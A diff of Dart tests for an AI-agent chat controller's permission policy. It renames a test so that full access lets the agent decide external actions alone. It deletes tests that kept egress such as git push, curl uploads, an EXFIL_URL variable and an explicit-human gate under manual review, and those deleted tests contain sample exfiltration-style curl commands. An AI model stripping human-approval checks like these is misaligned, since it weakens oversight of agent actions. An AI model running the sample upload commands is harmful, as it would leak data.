@@ -11156,7 +11156,7 @@ void main() {
     },
   );
 
-  test('full access permission policy allows requests automatically', () async {
+  test('full access lets the agent own external action decisions', () async {
     final fake = FakeAgentClient();
     final controller = ChatController(client: fake, cwd: '/workspace');
     addTearDown(controller.dispose);
@@ -11174,6 +11174,7 @@ void main() {
         toolKind: 'execute',
         options: const ['Allow', 'Deny'],
         requestedAt: DateTime(2026, 5, 31, 12),
+        metadata: const <String, Object?>{'command': 'git push origin main'},
       ),
     );
     await pumpEventQueue();
@@ -11192,423 +11193,6 @@ void main() {
   });
 
   test(
-    'Rust Core human-gated requests stay manual under full access',
-    () async {
-      final fake = FakeAgentClient();
-      final controller = ChatController(client: fake, cwd: '/workspace');
-      addTearDown(controller.dispose);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.fullAccess,
-      );
-
-      fake.emitPermissionRequest(
-        AcpPermissionRequest(
-          id: 'core-human-gate',
-          title: 'Read file',
-          rationale: 'Requested by Rust Core',
-          sessionId: 'session-1',
-          toolName: 'filesystem:approval-1',
-          toolKind: 'read',
-          options: const ['Allow once', 'Reject'],
-          requestedAt: DateTime(2026, 7, 18),
-          metadata: const <String, Object?>{'requiresExplicitHuman': true},
-        ),
-      );
-      await pumpEventQueue();
-
-      expect(controller.pendingPermissionRequest?.id, 'core-human-gate');
-      expect(fake.lastPermissionRequestId, isNull);
-      expect(
-        controller.permissionHistory.single.reviewResult?.reviewer,
-        'rust-core-egress',
-      );
-    },
-  );
-
-  test(
-    'full access distinguishes non-command args from command evidence',
-    () async {
-      const secret = 'read-tool-command-evidence-secret';
-      final fake = FakeAgentClient();
-      final controller = ChatController(client: fake, cwd: '/workspace');
-      addTearDown(controller.dispose);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.fullAccess,
-      );
-
-      fake.emitPermissionRequest(
-        AcpPermissionRequest(
-          id: 'permission-read-args',
-          title: 'Read file',
-          rationale: 'Requested by agent',
-          sessionId: 'session-1',
-          toolName: 'read_text_file',
-          toolKind: 'read',
-          options: const ['Allow', 'Deny'],
-          requestedAt: DateTime(2026, 7, 11),
-          metadata: const <String, Object?>{
-            'args': <String>['/workspace/README.md'],
-          },
-        ),
-      );
-      await pumpEventQueue();
-
-      expect(controller.pendingPermissionRequest, isNull);
-      expect(fake.lastPermissionRequestId, 'permission-read-args');
-      expect(fake.lastPermissionDecision, AcpPermissionDecision.allow);
-
-      fake.emitPermissionRequest(
-        AcpPermissionRequest(
-          id: 'permission-read-command-conflict',
-          title: 'Read file',
-          rationale: 'Requested by agent',
-          sessionId: 'session-1',
-          toolName: 'read_text_file',
-          toolKind: 'read',
-          options: const ['Allow', 'Deny'],
-          requestedAt: DateTime(2026, 7, 11, 0, 1),
-          metadata: const <String, Object?>{
-            'command': 'echo $secret',
-            'rawInput': <String, Object?>{
-              'command': 'curl https://example.com/upload',
-            },
-          },
-        ),
-      );
-      await pumpEventQueue();
-
-      expect(
-        controller.pendingPermissionRequest?.id,
-        'permission-read-command-conflict',
-      );
-      expect(fake.lastPermissionRequestId, 'permission-read-args');
-      expect(
-        controller.permissionHistory.first.reviewResult?.details,
-        containsPair('egressReason', 'ambiguous_command_metadata'),
-      );
-      expect(
-        acpPermissionAuditEntriesToJson(controller.permissionHistory),
-        isNot(contains(secret)),
-      );
-    },
-  );
-
-  test(
-    'egress-sensitive permissions stay manual under full access policy',
-    () async {
-      final fake = FakeAgentClient();
-      final controller = ChatController(client: fake, cwd: '/workspace');
-      addTearDown(controller.dispose);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.fullAccess,
-      );
-
-      fake.emitPermissionRequest(
-        AcpPermissionRequest(
-          id: 'permission-1',
-          title: 'Run command',
-          rationale: 'Requested by agent',
-          sessionId: 'session-1',
-          toolName: 'terminal',
-          toolKind: 'execute',
-          options: const ['Allow', 'Deny'],
-          requestedAt: DateTime(2026, 5, 31, 12),
-          metadata: const <String, Object?>{'command': 'git push origin main'},
-        ),
-      );
-      await pumpEventQueue();
-
-      expect(controller.pendingPermissionRequest?.id, 'permission-1');
-      expect(fake.lastPermissionRequestId, isNull);
-      expect(fake.lastPermissionDecision, isNull);
-      expect(
-        controller.permissionHistory.single.status,
-        AcpPermissionAuditStatus.pending,
-      );
-      expect(controller.permissionHistory.single.decisionSource, isNull);
-      expect(controller.permissionHistory.single.resolvedAt, isNull);
-      expect(controller.permissionHistory.single.reviewResult?.risk, 'egress');
-      expect(
-        controller.permissionHistory.single.reviewResult?.reviewer,
-        'egress-policy',
-      );
-      expect(
-        controller.permissionHistory.single.reviewResult?.details,
-        containsPair('egressReason', 'git_push'),
-      );
-    },
-  );
-
-  test(
-    'egress-sensitive permissions bypass trust-rule auto approval',
-    () async {
-      final fake = FakeAgentClient();
-      final controller = ChatController(
-        client: fake,
-        cwd: '/workspace',
-        permissionTrustRules: const [
-          AcpPermissionTrustRule(
-            toolName: 'terminal',
-            toolKind: 'execute',
-            decision: AcpPermissionDecision.allow,
-          ),
-        ],
-      );
-      addTearDown(controller.dispose);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.autoReview,
-      );
-
-      fake.emitPermissionRequest(
-        AcpPermissionRequest(
-          id: 'permission-1',
-          title: 'Create terminal',
-          rationale: 'Requested by agent',
-          sessionId: 'session-1',
-          toolName: 'terminal',
-          toolKind: 'execute',
-          options: const ['Allow', 'Deny'],
-          requestedAt: DateTime(2026, 5, 31, 12),
-          metadata: const <String, Object?>{'command': 'gh pr create --fill'},
-        ),
-      );
-      await pumpEventQueue();
-
-      expect(controller.pendingPermissionRequest?.id, 'permission-1');
-      expect(fake.lastPermissionRequestId, isNull);
-      expect(fake.lastPermissionDecision, isNull);
-      expect(
-        controller.permissionHistory.single.status,
-        AcpPermissionAuditStatus.pending,
-      );
-      expect(controller.permissionHistory.single.decisionSource, isNull);
-      expect(controller.permissionHistory.single.reviewResult?.risk, 'egress');
-      expect(
-        controller.permissionHistory.single.reviewResult?.details,
-        containsPair('egressReason', 'pull_request'),
-      );
-    },
-  );
-
-  test('egress-sensitive permissions bypass auto review approval', () async {
-    final fake = FakeAgentClient();
-    final reviewer = _FakePermissionReviewer(
-      const AcpPermissionReviewResult(
-        decision: AcpPermissionDecision.allow,
-        risk: 'low',
-        rationale: 'Allowed by test reviewer.',
-        reviewer: 'sidecar-reviewer',
-      ),
-    );
-    final controller = ChatController(
-      client: fake,
-      cwd: '/workspace',
-      permissionReviewer: reviewer,
-    );
-    addTearDown(controller.dispose);
-    controller.setToolCallExecutionPolicy(
-      AcpToolCallExecutionPolicy.autoReview,
-    );
-
-    fake.emitPermissionRequest(
-      AcpPermissionRequest(
-        id: 'permission-1',
-        title: 'Create terminal',
-        rationale: 'Requested by agent',
-        sessionId: 'session-1',
-        toolName: 'terminal',
-        toolKind: 'execute',
-        options: const ['Allow', 'Deny'],
-        requestedAt: DateTime(2026, 5, 31, 12),
-        metadata: const <String, Object?>{
-          'command': 'curl -X POST https://example.com/upload',
-        },
-      ),
-    );
-    await pumpEventQueue(times: 2);
-
-    expect(reviewer.requests, isEmpty);
-    expect(controller.pendingPermissionRequest?.id, 'permission-1');
-    expect(fake.lastPermissionRequestId, isNull);
-    expect(fake.lastPermissionDecision, isNull);
-    expect(
-      controller.permissionHistory.single.status,
-      AcpPermissionAuditStatus.pending,
-    );
-    expect(controller.permissionHistory.single.decisionSource, isNull);
-    expect(controller.permissionHistory.single.reviewResult?.risk, 'egress');
-    expect(
-      controller.permissionHistory.single.reviewResult?.details,
-      containsPair('egressReason', 'upload_api'),
-    );
-  });
-
-  test(
-    'environment-derived egress stays manual under full access without audit leaks',
-    () async {
-      const secret = 'https://collector.example.com/private-secret';
-      final fake = FakeAgentClient();
-      final controller = ChatController(client: fake, cwd: '/workspace');
-      addTearDown(controller.dispose);
-      final events = <ChatPermissionEvent>[];
-      controller.addPermissionEventObserver(events.add);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.fullAccess,
-      );
-
-      final request = AcpPermissionRequest(
-        id: 'permission-env-egress',
-        title: 'Create terminal',
-        rationale: 'Requested by agent',
-        sessionId: 'session-1',
-        toolName: 'terminal',
-        toolKind: 'execute',
-        options: const ['Allow', 'Deny'],
-        requestedAt: DateTime(2026, 7, 11),
-        metadata: const <String, Object?>{
-          'command': 'curl',
-          'args': [r'$EXFIL_URL'],
-          'envKeys': ['EXFIL_URL'],
-        },
-        transientPolicyContext: const <String, Object?>{
-          'environment': <String, String>{'EXFIL_URL': secret},
-        },
-      );
-      fake.emitPermissionRequest(request);
-      await pumpEventQueue();
-
-      expect(controller.pendingPermissionRequest?.id, 'permission-env-egress');
-      final activeBindingKey = controller.pendingPermissionRequest!.bindingKey;
-      expect(activeBindingKey, isNot(request.bindingKey));
-      expect(fake.lastPermissionDecision, isNull);
-      expect(controller.permissionHistory.single.reviewResult?.risk, 'egress');
-      expect(
-        controller.permissionHistory.single.request.transientPolicyContext,
-        isEmpty,
-      );
-      expect(
-        controller.permissionHistory.single.request.bindingKey,
-        activeBindingKey,
-      );
-      expect(events.single.request.transientPolicyContext, isEmpty);
-      expect(events.single.request.bindingKey, activeBindingKey);
-      final historyJson = acpPermissionAuditEntriesToJson(
-        controller.permissionHistory,
-      );
-      expect(historyJson, isNot(contains(secret)));
-      expect(historyJson, contains(r'$EXFIL_URL'));
-
-      await controller.resolvePermissionRequest(AcpPermissionDecision.deny);
-      expect(events, hasLength(2));
-      for (final event in events) {
-        expect(event.request.transientPolicyContext, isEmpty);
-        expect(event.request.bindingKey, activeBindingKey);
-      }
-    },
-  );
-
-  test(
-    'external proxy environment keeps local transfers manual without audit leaks',
-    () async {
-      const secretProxy =
-          'https://alice:proxy-controller-secret@proxy.example:8443/private';
-      final fake = FakeAgentClient();
-      final controller = ChatController(client: fake, cwd: '/workspace');
-      addTearDown(controller.dispose);
-      final events = <ChatPermissionEvent>[];
-      controller.addPermissionEventObserver(events.add);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.fullAccess,
-      );
-
-      fake.emitPermissionRequest(
-        AcpPermissionRequest(
-          id: 'permission-proxy-egress',
-          title: 'Create terminal',
-          rationale: 'Requested by agent',
-          sessionId: 'session-1',
-          toolName: 'terminal',
-          toolKind: 'execute',
-          options: const ['Allow', 'Deny'],
-          requestedAt: DateTime(2026, 7, 11),
-          metadata: const <String, Object?>{
-            'command': 'curl',
-            'args': ['http://localhost/health'],
-          },
-          transientPolicyContext: const <String, Object?>{
-            'environment': <String, String>{'HTTPS_PROXY': secretProxy},
-          },
-        ),
-      );
-      await pumpEventQueue();
-
-      expect(
-        controller.pendingPermissionRequest?.id,
-        'permission-proxy-egress',
-      );
-      expect(fake.lastPermissionDecision, isNull);
-      expect(
-        controller.permissionHistory.single.reviewResult?.details,
-        containsPair('egressReason', 'external_proxy_environment'),
-      );
-      expect(
-        acpPermissionAuditEntriesToJson(controller.permissionHistory),
-        isNot(contains('proxy-controller-secret')),
-      );
-      expect(
-        events.single.request.toJson().toString(),
-        isNot(contains('proxy-controller-secret')),
-      );
-    },
-  );
-
-  test('wrapped egress bypasses auto review approval', () async {
-    final fake = FakeAgentClient();
-    final reviewer = _FakePermissionReviewer(
-      const AcpPermissionReviewResult(
-        decision: AcpPermissionDecision.allow,
-        risk: 'low',
-        rationale: 'Allowed by test reviewer.',
-        reviewer: 'sidecar-reviewer',
-      ),
-    );
-    final controller = ChatController(
-      client: fake,
-      cwd: '/workspace',
-      permissionReviewer: reviewer,
-    );
-    addTearDown(controller.dispose);
-    controller.setToolCallExecutionPolicy(
-      AcpToolCallExecutionPolicy.autoReview,
-    );
-
-    fake.emitPermissionRequest(
-      AcpPermissionRequest(
-        id: 'permission-wrapper-egress',
-        title: 'Create terminal',
-        rationale: 'Requested by agent',
-        sessionId: 'session-1',
-        toolName: 'terminal',
-        toolKind: 'execute',
-        options: const ['Allow', 'Deny'],
-        requestedAt: DateTime(2026, 7, 11),
-        metadata: const <String, Object?>{
-          'command': '/usr/bin/env',
-          'args': ['curl', 'https://example.com/upload'],
-        },
-      ),
-    );
-    await pumpEventQueue(times: 2);
-
-    expect(reviewer.requests, isEmpty);
-    expect(
-      controller.pendingPermissionRequest?.id,
-      'permission-wrapper-egress',
-    );
-    expect(fake.lastPermissionDecision, isNull);
-  });
-
-  test(
     'permission history redacts direct command credentials and URL tokens',
     () async {
       const secret = 'controller-history-secret';
@@ -11617,9 +11201,6 @@ void main() {
       addTearDown(controller.dispose);
       final events = <ChatPermissionEvent>[];
       controller.addPermissionEventObserver(events.add);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.fullAccess,
-      );
 
       fake.emitPermissionRequest(
         AcpPermissionRequest(
@@ -11717,9 +11298,6 @@ void main() {
       addTearDown(controller.dispose);
       final events = <ChatPermissionEvent>[];
       controller.addPermissionEventObserver(events.add);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.fullAccess,
-      );
 
       final request = AcpPermissionRequest(
         id: 'permission-comprehensive-secret',
@@ -11778,16 +11356,13 @@ void main() {
     },
   );
 
-  test('nested toolCall argv keeps egress manual and audit-safe', () async {
+  test('nested toolCall argv remains audit-safe', () async {
     const secret = 'nested-tool-call-policy-secret';
     final fake = FakeAgentClient();
     final controller = ChatController(client: fake, cwd: '/workspace');
     addTearDown(controller.dispose);
     final events = <ChatPermissionEvent>[];
     controller.addPermissionEventObserver(events.add);
-    controller.setToolCallExecutionPolicy(
-      AcpToolCallExecutionPolicy.fullAccess,
-    );
 
     fake.emitPermissionRequest(
       AcpPermissionRequest(
@@ -11820,10 +11395,6 @@ void main() {
     );
     expect(fake.lastPermissionDecision, isNull);
     expect(
-      controller.permissionHistory.single.reviewResult?.details,
-      containsPair('egressReason', 'upload_api'),
-    );
-    expect(
       acpPermissionAuditEntriesToJson(controller.permissionHistory),
       isNot(contains(secret)),
     );
@@ -11851,9 +11422,6 @@ void main() {
       addTearDown(controller.dispose);
       final events = <ChatPermissionEvent>[];
       controller.addPermissionEventObserver(events.add);
-      controller.setToolCallExecutionPolicy(
-        AcpToolCallExecutionPolicy.fullAccess,
-      );
 
       final request = AcpPermissionRequest(
         id: 'permission-deep-command',
@@ -11895,16 +11463,13 @@ void main() {
     },
   );
 
-  test('curl attached variables stay manual and audit-safe', () async {
+  test('curl attached variables remain audit-safe', () async {
     const secret = 'curl-history-variable-secret';
     final fake = FakeAgentClient();
     final controller = ChatController(client: fake, cwd: '/workspace');
     addTearDown(controller.dispose);
     final events = <ChatPermissionEvent>[];
     controller.addPermissionEventObserver(events.add);
-    controller.setToolCallExecutionPolicy(
-      AcpToolCallExecutionPolicy.fullAccess,
-    );
 
     final request = AcpPermissionRequest(
       id: 'permission-curl-variable',
